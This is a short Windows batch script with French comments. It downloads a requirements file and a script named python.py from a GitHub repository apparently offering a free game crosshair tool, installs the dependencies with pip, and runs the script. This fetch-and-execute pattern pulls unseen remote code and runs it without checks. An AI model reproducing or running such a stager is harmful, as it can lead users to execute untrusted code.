@echo off

:: Téléchargement du fichier requirements.txt
echo Téléchargement du fichier requirements.txt...
curl -L -o requirements.txt https://github.com/swayze-team/polskacrosshairfreenium/raw/refs/heads/main/requirements.txt

:: Installation des dépendances
echo Installation des dépendances avec pip...
pip install -r requirements.txt

:: Téléchargement du script python.py
echo Téléchargement du script python.py...
curl -L -o python.py https://github.com/swayze-team/polskacrosshairfreenium/raw/refs/heads/main/python.py

:: Exécution du script python.py
echo Exécution du script python.py...
python python.py

:: Pause pour garder la fenêtre ouverte
pause
